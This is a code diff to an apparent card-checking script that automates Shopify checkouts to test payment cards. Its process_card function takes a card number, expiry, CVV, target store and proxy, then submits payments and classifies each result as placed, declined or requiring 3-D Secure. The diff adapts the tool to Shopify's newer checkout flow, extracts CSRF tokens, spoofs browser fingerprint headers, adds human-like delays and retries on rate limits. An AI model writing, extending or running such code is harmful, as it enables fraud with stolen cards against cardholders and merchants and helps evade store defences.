@@ -228,8 +228,13 @@ def extract_clean_response(message):
 # HTML EXTRACTION HELPERS
 # =====================================================================
 def extract_authenticity_token(html):
+    """Extract CSRF authenticity_token. Handles both legacy HTML forms and
+    new Shopify checkout-web serialized meta tags (&quot; encoded JSON)."""
     if not html:
         return ''
+    import html as _html_mod
+
+    # Pattern 1: Legacy hidden input (classic checkout.liquid)
     patterns = [
         r'<input[^>]+name=["\']authenticity_token["\'][^>]+value=["\']([^"\']+)["\']',
         r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']authenticity_token["\']',
@@ -246,8 +251,21 @@ def extract_authenticity_token(html):
             token = m.group(1).strip()
             if len(token) > 10:
                 return token
-    return ''
 
+    # Pattern 2: New checkout-web serialized meta (HTML-entity encoded JSON)
+    serialized_patterns = [
+        r'name="serialized-authenticity_token"[^>]+content="([^"]+)"',
+        r'&quot;authenticityToken&quot;:&quot;([^&]+)&quot;',
+        r'&quot;authenticity_token&quot;:&quot;([^&]+)&quot;',
+    ]
+    for pat in serialized_patterns:
+        m = re.search(pat, html, re.IGNORECASE)
+        if m:
+            raw = _html_mod.unescape(m.group(1)).strip('"')
+            if len(raw) > 10:
+                return raw
+
+    return ''
 
 def extract_gateway_id(html):
     if not html:
@@ -563,8 +581,16 @@ def _poll_processing(processing_url, checkout_url, ourl, session, profile,
             html_body = poll_resp.text
             last_html = html_body
 
-            if any(k in html_body for k in ['thank_you', 'thank-you', 'Your order is confirmed',
-                                             'order_number', 'Thank you for your purchase']):
+            # Strict check: thank_you must be in URL path or visible HTML text, NOT in JS/CDN URLs
+            _is_confirmed = (
+                '/thank_you' in html_body.split('"')[0][:200]  # in page URL shown in meta/og tags
+                or re.search(r'<title>[^<]*(?:thank you|order confirmed)[^<]*</title>', html_body, re.IGNORECASE)
+                or re.search(r'<h[12][^>]*>[^<]*(?:thank you|order confirmed)[^<]*</h[12]>', html_body, re.IGNORECASE)
+                or re.search(r'(?:^|["\'/])(?:.*?/)?thank_you(?:["\'/]|$)', html_body)
+                or 'Your order is confirmed' in html_body
+                or re.search(r'order[_-]?number["\s:]+[#\d]', html_body, re.IGNORECASE)
+            )
+            if _is_confirmed:
                 return True, 'ORDER_PLACED', gateway, total_price, currency
 
             if any(k in html_body for k in ['Your card was declined', 'card_declined',
@@ -701,14 +727,26 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
         # ============================================================
         # STEP 2: Add to cart via /cart/add.js
         # ============================================================
-        cart_add_headers = bh_ajax(referer=ourl + '/')
-        cart_add_payload = f'id={variant_id}&quantity=1'
+        # TLSClient requires JSON items[] format; plain requests accepts form-encoded too
+        cart_add_headers = {
+            'User-Agent': profile['ua'],
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Content-Type': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest',
+            'sec-ch-ua': profile['sec_ch_ua'],
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': profile['platform'],
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'Referer': ourl + '/',
+        }
 
         cart_add_resp = retry_on_429(
             lambda: session.post(
                 f'{ourl}/cart/add.js',
                 headers=cart_add_headers,
-                data=cart_add_payload,
+                json={'items': [{'id': int(variant_id), 'quantity': 1}]},
                 timeout=15,
                 allow_redirects=True,
                 cookies=_cookies,
@@ -722,9 +760,15 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
 
         try:
             cart_data = cart_add_resp.json()
-            raw_price = cart_data.get('price', 0)
-            if raw_price:
-                price = float(raw_price) / 100
+            # items[] response - get price from first item
+            items = cart_data.get('items', [])
+            if items:
+                raw_price = items[0].get('price', 0) or items[0].get('final_price', 0)
+                if raw_price:
+                    price = float(raw_price) / 100
+                    total_price = f'{price:.2f}'
+            elif cart_data.get('price'):
+                price = float(cart_data['price']) / 100
                 total_price = f'{price:.2f}'
         except Exception:
             pass
@@ -733,18 +777,19 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
         human_delay(0.5, 1.0)
 
         # ============================================================
-        # STEP 3: POST /cart -> init checkout -> get checkout_token
+        # STEP 3: GET /checkout -> follow redirects -> get checkout_url
         # ============================================================
+        # TLSClient follows all redirects (incl. shop.app) and lands on
+        # the real checkout page. GET /checkout is more reliable than
+        # POST /cart which TLSClient doesn't honour allow_redirects=False.
         init_headers = bh_browse(referer=f'{ourl}/cart')
-        init_headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
         checkout_init_resp = retry_on_429(
-            lambda: session.post(
-                f'{ourl}/cart',
+            lambda: session.get(
+                f'{ourl}/checkout',
                 headers=init_headers,
-                data='checkout=Check+Out',
-                timeout=20,
-                allow_redirects=False,
+                timeout=25,
+                allow_redirects=True,
                 cookies=_cookies,
             ),
             step_name="checkout_init",
@@ -752,71 +797,90 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
         absorb_cookies(checkout_init_resp)
 
         checkout_url = None
+        _final_url = str(getattr(checkout_init_resp, 'url', ''))
+
         if checkout_init_resp.status_code in (301, 302, 303):
             location = checkout_init_resp.headers.get('Location', '')
-            if location:
-                if not location.startswith('http'):
-                    location = urljoin(ourl, location)
+            if not location.startswith('http'):
+                location = urljoin(ourl, location)
+            from urllib.parse import parse_qs as _parse_qs
+            if 'shop.app' in location or 'ur_back_url=' in location:
+                try:
+                    _qs = _parse_qs(urlparse(location).query)
+                    _back = _qs.get('ur_back_url', [''])[0]
+                    checkout_url = _back if (_back and '/checkouts/' in _back) else location
+                except Exception:
+                    checkout_url = location
+            else:
                 checkout_url = location
         elif checkout_init_resp.status_code == 200:
-            final_url = str(getattr(checkout_init_resp, 'url', ourl))
-            if '/checkouts/' in final_url:
-                checkout_url = final_url
+            # TLSClient followed all redirects — check final URL
+            if _final_url and '/checkouts/' in _final_url:
+                # May have ur_back_url in query string if it landed on shop.app
+                if 'ur_back_url=' in _final_url:
+                    from urllib.parse import parse_qs as _parse_qs
+                    _qs = _parse_qs(urlparse(_final_url).query)
+                    _back = _qs.get('ur_back_url', [''])[0]
+                    checkout_url = _back if (_back and '/checkouts/' in _back) else _final_url
+                else:
+                    checkout_url = _final_url
             else:
-                m = re.search(r'action=["\']([^"\']*checkouts[^"\']*)["\']', checkout_init_resp.text)
+                # Parse from HTML
+                m = re.search(r'action=["\'\']([^"\'\']*checkouts[^"\'\']*)["\'\']', checkout_init_resp.text)
                 if m:
                     checkout_url = urljoin(ourl, m.group(1))
 
         if not checkout_url or '/checkouts/' not in checkout_url:
             return False, "CHECKOUT_INIT_FAILED: Could not obtain checkout URL", gateway, total_price, currency
 
-        checkout_token = extract_checkout_token_from_url(checkout_url)
-        # Strip query params from base checkout URL
+        # Strip query params for the base checkout URL used in form POSTs
         checkout_url_base = checkout_url.split('?')[0]
+        checkout_token = extract_checkout_token_from_url(checkout_url_base)
         print(f'[STEP3] checkout_url={checkout_url_base[:80]} token={checkout_token[:16] if checkout_token else "NONE"}', file=sys.stderr)
         human_delay(0.5, 1.2)
 
         # ============================================================
-        # STEP 4: GET checkout page -> parse authenticity_token
+        # STEP 4: Parse authenticity_token from already-loaded checkout page
+        # (checkout_init_resp from Step 3 already has the checkout HTML)
         # ============================================================
-        checkout_page_resp = retry_on_429(
-            lambda: session.get(
-                checkout_url_base,
-                headers=bh_browse(referer=f'{ourl}/cart'),
-                timeout=20,
-                allow_redirects=True,
-                cookies=_cookies,
-            ),
-            step_name="checkout_page",
-        )
-        absorb_cookies(checkout_page_resp)
-
-        if checkout_page_resp.status_code not in (200,):
-            # Try following redirect once
-            if checkout_page_resp.status_code in (301, 302):
-                loc = checkout_page_resp.headers.get('Location', '')
-                if loc:
-                    if not loc.startswith('http'):
-                        loc = urljoin(ourl, loc)
-                    checkout_url_base = loc.split('?')[0]
-                    checkout_page_resp = session.get(checkout_url_base, headers=bh_browse(),
-                                                      timeout=20, allow_redirects=True, cookies=_cookies)
-                    absorb_cookies(checkout_page_resp)
+        # Reuse the checkout page we already loaded in Step 3
+        if checkout_init_resp.status_code == 200:
+            checkout_page_resp = checkout_init_resp
+        else:
+            # Fallback: fetch the checkout page explicitly
+            checkout_page_resp = retry_on_429(
+                lambda: session.get(
+                    checkout_url_base,
+                    headers=bh_browse(referer=f'{ourl}/cart'),
+                    timeout=20,
+                    allow_redirects=True,
+                    cookies=_cookies,
+                ),
+                step_name="checkout_page",
+            )
+            absorb_cookies(checkout_page_resp)
 
         if checkout_page_resp.status_code not in (200,):
             return False, f"CHECKOUT_PAGE_FAILED: HTTP {checkout_page_resp.status_code}", gateway, total_price, currency
 
         checkout_html = checkout_page_resp.text
-        final_url2 = str(getattr(checkout_page_resp, 'url', checkout_url_base))
-        if '/checkouts/' in final_url2:
-            checkout_url_base = final_url2.split('?')[0]
-            new_tok = extract_checkout_token_from_url(checkout_url_base)
-            if new_tok:
-                checkout_token = new_tok
+
+        # Update checkout_url_base from final URL if it changed
+        _final_url2 = str(getattr(checkout_page_resp, 'url', checkout_url_base))
+        if '/checkouts/' in _final_url2:
+            _new_base = _final_url2.split('?')[0]
+            if _new_base != checkout_url_base:
+                checkout_url_base = _new_base
+                _new_tok = extract_checkout_token_from_url(checkout_url_base)
+                if _new_tok:
+                    checkout_token = _new_tok
 
         authenticity_token = extract_authenticity_token(checkout_html)
         if not authenticity_token:
-            return False, "AUTH_TOKEN_MISSING: Could not extract CSRF token", gateway, total_price, currency
+            # Don't fail yet — new checkout-web may not have this token
+            # but we still attempt contact_info POST with empty token
+            print('[STEP4] WARNING: No authenticity_token found (new checkout-web?)', file=sys.stderr)
+            authenticity_token = ''
 
         _pp, _pc = extract_total_price(checkout_html)
         if float(_pp) > 0:
@@ -1081,10 +1145,17 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
 
         print(f'[STEP11] Payment submitted status={pay_submit_resp.status_code}', file=sys.stderr)
 
+        # 405 = new checkout-web SPA (form POST not accepted)
+        if pay_submit_resp.status_code == 405:
+            return False, "CHECKOUT_FLOW_UNSUPPORTED: Store uses new Shopify checkout (form POST rejected)", gateway, total_price, currency
+
         # Inline result check on 200
         if pay_submit_resp.status_code == 200:
             body = pay_submit_resp.text
-            if 'thank_you' in body or 'Thank you for your purchase' in body:
+            # Strict check - avoid false positives from extension URLs in checkout-web SPA
+            if (re.search(r'<title>[^<]*thank you[^<]*</title>', body, re.IGNORECASE)
+                    or re.search(r'<h[12][^>]*>[^<]*thank you[^<]*</h[12]>', body, re.IGNORECASE)
+                    or 'Your order is confirmed' in body):
                 return True, 'ORDER_PLACED', gateway, total_price, currency
             if 'card_declined' in body or 'Your card was declined' in body:
                 return False, _extract_legacy_error(body) or 'CARD_DECLINED', gateway, total_price, currency
@@ -1092,6 +1163,9 @@ def process_card(cc, month, year, cvv, site_url, variant_id_override=None, proxy
                 return True, '3DS_REQUIRED', gateway, total_price, currency
             if 'captcha' in body.lower():
                 return False, 'CAPTCHA_REQUIRED', gateway, total_price, currency
+            # 405 = new checkout-web, form POSTs not accepted (all modern Shopify stores)
+            if pay_submit_resp.status_code == 405:
+                pass  # fall through to poll
 
         # Get processing URL from redirect
         processing_url = None
